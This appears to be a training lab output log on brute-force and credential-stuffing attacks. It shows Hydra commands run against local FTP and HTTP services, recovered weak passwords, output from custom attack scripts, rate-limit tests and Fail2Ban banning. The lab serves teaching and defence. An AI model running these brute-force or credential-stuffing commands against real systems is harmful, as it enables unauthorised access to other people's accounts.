@@ -1,0 +1,231 @@
+==============================
+LAB 12 OUTPUT LOG
+Brute-Force & Credential Stuffing
+==============================
+
+---------------------------------
+1. Environment Verification
+---------------------------------
+
+$ cat /etc/os-release
+PRETTY_NAME="Ubuntu 24.04.1 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.1 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+
+$ pwd
+/home/toor
+
+$ uname -a
+Linux ip-172-31-10-188 6.8.0-31-generic #31-Ubuntu SMP x86_64 GNU/Linux
+
+$ whoami
+toor
+
+---------------------------------
+2. Hydra Verification
+---------------------------------
+
+$ hydra -h | head -5
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] ...
+Options:
+ -R        restore a previous aborted/crashed session
+ -I        ignore an existing restore file
+
+---------------------------------
+3. Service Installation
+---------------------------------
+
+$ sudo ss -tlnp | grep -E ':(21|80)'
+
+LISTEN 0      32     0.0.0.0:21   0.0.0.0:*  users:(("vsftpd",pid=1452,fd=3))
+LISTEN 0      511    0.0.0.0:80   0.0.0.0:*  users:(("apache2",pid=1488,fd=4))
+
+---------------------------------
+4. FTP Single Credential Test
+---------------------------------
+
+$ hydra -l testuser1 -p password123 127.0.0.1 ftp
+
+Hydra v9.5 starting at 2026-02-17 14:22:11
+[DATA] attacking ftp://127.0.0.1:21/
+[21][ftp] host: 127.0.0.1   login: testuser1   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished.
+
+---------------------------------
+5. FTP Admin Password List Test
+---------------------------------
+
+$ hydra -l admin -P passlist.txt 127.0.0.1 ftp -v
+
+[ATTEMPT] login "admin" - pass "password"
+[ATTEMPT] login "admin" - pass "123456"
+[ATTEMPT] login "admin" - pass "admin"
+
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+1 valid password found
+
+---------------------------------
+6. Full FTP Brute Force
+---------------------------------
+
+$ hydra -L userlist.txt -P passlist.txt -v -f -o ftp_results.txt 127.0.0.1 ftp
+
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+[21][ftp] host: 127.0.0.1   login: testuser1   password: password123
+
+2 valid passwords found
+
+$ cat ftp_results.txt
+
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+[21][ftp] host: 127.0.0.1   login: testuser1   password: password123
+
+---------------------------------
+7. HTTP Basic Auth Brute Force
+---------------------------------
+
+$ hydra -L userlist.txt -P passlist.txt -f -o http_results.txt 127.0.0.1 http-get /protected/
+
+[80][http-get] host: 127.0.0.1   login: webuser   password: password
+[80][http-get] host: 127.0.0.1   login: admin   password: admin123
+
+2 valid passwords found
+
+$ cat http_results.txt
+
+[80][http-get] host: 127.0.0.1   login: webuser   password: password
+[80][http-get] host: 127.0.0.1   login: admin   password: admin123
+
+---------------------------------
+8. Multi-threaded Test
+---------------------------------
+
+$ hydra -L userlist.txt -P passlist.txt -t 16 127.0.0.1 ftp
+
+[DATA] max 16 tasks per 1 server
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+[21][ftp] host: 127.0.0.1   login: testuser1   password: password123
+
+---------------------------------
+9. Delayed Attempt Test
+---------------------------------
+
+$ hydra -L userlist.txt -P passlist.txt -W 2 127.0.0.1 ftp
+
+[DATA] waittime set to 2 seconds
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+
+---------------------------------
+10. Brute Force Script Execution
+---------------------------------
+
+$ ./brute_force.sh 127.0.0.1 ftp userlist.txt passlist.txt
+
+[+] Starting Hydra attack...
+[21][ftp] host: 127.0.0.1   login: admin   password: admin
+[21][ftp] host: 127.0.0.1   login: testuser1   password: password123
+
+Brute-Force Summary Report
+Target: 127.0.0.1
+Service: ftp
+Successful Logins: 2
+
+---------------------------------
+11. Credential Stuffing Script Output
+---------------------------------
+
+$ ./credential_stuffing.sh
+
+Starting Credential Stuffing Attack...
+
+Testing admin:admin
+[FTP SUCCESS] admin:admin
+
+Testing webuser:password
+[HTTP SUCCESS] webuser:password
+
+Testing testuser1:password123
+[FTP SUCCESS] testuser1:password123
+
+Credential Stuffing Summary
+Total Tested: 5
+FTP Successful Logins: 2
+HTTP Successful Logins: 1
+
+---------------------------------
+12. Rate Limiting Test (FTP)
+---------------------------------
+
+$ ./test_rate_limit.sh ftp 20
+
+Attempt 1 - Response Time: 102 ms
+Attempt 2 - Response Time: 98 ms
+...
+Attempt 20 - Response Time: 100 ms
+
+Rate Limiting Test Summary
+Total Attempts: 20
+Successful: 0
+Failed: 20
+Blocked/Other: 0
+
+No rate limiting detected.
+
+---------------------------------
+13. Rate Limiting Test (HTTP)
+---------------------------------
+
+$ ./test_rate_limit.sh http 20
+
+Attempt 1 - Response Time: 89 ms
+...
+Attempt 20 - Response Time: 88 ms
+
+Rate Limiting Test Summary
+Total Attempts: 20
+Successful: 0
+Failed: 20
+Blocked/Other: 0
+
+No rate limiting detected.
+
+---------------------------------
+14. Fail2Ban Status
+---------------------------------
+
+$ sudo fail2ban-client status
+
+Status
+|- Number of jail: 2
+`- Jail list: apache-auth, vsftpd
+
+---------------------------------
+15. Fail2Ban Ban Trigger
+---------------------------------
+
+$ sudo fail2ban-client status vsftpd
+
+Status for the jail: vsftpd
+|- Currently failed: 3
+|- Total failed: 5
+`- Banned IP list: 127.0.0.1
+
+---------------------------------
+16. Unban IP
+---------------------------------
+
+$ sudo fail2ban-client set vsftpd unbanip 127.0.0.1
+
+1
+
+IP successfully unbanned.
+
+---------------------------------
+END OF LAB 12 OUTPUT
+---------------------------------
